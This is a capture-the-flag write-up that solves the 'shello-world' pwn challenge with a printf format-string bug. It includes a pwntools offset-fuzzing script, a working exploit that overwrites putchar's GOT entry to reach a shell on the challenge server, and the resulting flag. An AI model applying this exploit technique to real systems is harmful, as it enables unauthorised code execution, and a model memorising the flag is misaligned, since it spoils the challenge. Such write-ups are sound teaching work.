# SHELLO-WORLD

## Description

> Greetings, traveler
>
> Author: tomadimitrie
>
> [shello-world](./shello-world)

Tags: _pwn|warmup_

## Solution

Before even running the program, I like to examine the source code using `ghidra` to understand exactly what it does. The program consists of three functions: _main_, _vuln_ and _win_. The _win_ function grants access to a shell, which is our objective to achieve in order to win. The _main_ function simply calls the _vuln_ function, and the _vuln_ function is as follows:

```c
void vuln(void)

{
  ...

  fgets((char *)&local_108,0x100,stdin);
  printf("Hello, ");
  printf((char *)&local_108);
  putchar(10);
  return;
}
```

It defines several local variables and uses `fgets` to retrieve user input, with a buffer size of `0x100` in hexadecimal or `256` in decimal. After that, it prints "Hello, " followed by the user input and concludes by calling `putchar(10)` to print a newline.

I tried to perform a buffer overflow against this binary, but it didn't work due to the input length restriction imposed by `fgets`. However, there is still a way to exploit this program using a `string format vulnerability`, where the attacker can read information from the stack or even gain an arbitrary write primitive. We can confirm that the binary is vulnerable because if we input format string specifiers like `%p`, it will start leaking pointers from the stack.

```
$ ./shello-world
%p %p %p %p
Hello, 0x7fff2bae3e30 (nil) (nil) 0x1
```

To exploit this vulnerability, we need to follow these steps:

1. Find the offset from where `printf` starts reading from the stack to our input. This offset will be used later to building the exploit.
2. Identify a function that is called after the vulnerable `printf`, like `putchar`.
3. Create the appropriate exploit to overwrite the address of the target function (`putchar`) in the Global Offset Table (GOT) with the address of the _win_ function. This way, when the program calls `putchar`, it will actually call _win_.

To find the offset I used the following Python script that sends the payload `AAAAAAAA%[counter]%p` to the program 100 times and retrieve the responses.

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF("shello-world", checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        io = process(elf.path, level='error')
        # Print the pointer at offset i
        io.sendline(b'A'*8 + '%{}$p'.format(i).encode())
        # Receive the response with a large buffer size
        result = io.recv(4096)
        # Find the position of 'Hello, ' in the response
        hello_pos = result.find(b'Hello, ')
        if hello_pos != -1:
            # Extract the formatted value from the response
            formatted_value = result[hello_pos + len(b'Hello, '):].strip()
            print(f"{i}: {formatted_value}")
        # Exit the process
        io.close()
    except EOFError:
        pass
```

The output of the script should look like this:

```
$ python fuzz.py
0: b'AAAAAAAA%0$p'
1: b'AAAAAAAA0x7ffdc830b720'
2: b'AAAAAAAA(nil)'
3: b'AAAAAAAA(nil)'
4: b'AAAAAAAA0x1'
5: b'AAAAAAAA(nil)'
6: b'AAAAAAAA0x4141414141414141'
7: b'AAAAAAAA0xa70243725'
8: b'AAAAAAAA(nil)'
...
```

We can see that our input `AAAAAAAA` is written at the offset `6` in the stack, remember that `4141414141414141` is `AAAAAAAA` in hexadecimal.

After finding the offset, we can write the payload manually but the formula to do that gets a little bit complex, however you can read how to do it [here](https://axcheron.github.io/exploit-101-format-strings/#writing-to-the-stack)

Instead I used the `pwntools` module `FmtStr()` to automate the calculation and exploitation. Remember that everything else outside the exploit section is a template where you should change just a few things like the `REMOTE` parameters with the connection values of your container.

```python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("shello-world")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("challs.tfcctf.com", 31769)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

# Create the FmtStr object and specify the offset to the first argument on the stack
format_string = FmtStr(execute_fmt=io.sendline, offset=6)

# Overwrite putchar() in GOT with win()
format_string.write(elf.got.putchar, elf.sym.win)

# Execute the format string writes
format_string.execute_writes()

#============================================================

# Interact with the process
io.interactive()
```

Execute the script with the `REMOTE` parameter and get the flag!

```shell
$ ./solve.py REMOTE
[*] '/home/jovenoven/Downloads/TFC_CTF/pwn/shello-world/shello-world'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challs.tfcctf.com on port 30965: Done
[*] format string offset: 6
[*] address to overwrite (elf.got.printf): 0x404000
[*] address to write (elf.sym.win): 0x401176
[*] Switching to interactive mode
Hello,                                                                                                                                                                                                                                                                                 \x00                                              7aaaab$
$ whoami
ctf
$ ls
flag.txt
shello-world
$ cat flag.txt
TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}
```

Flag `TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}`
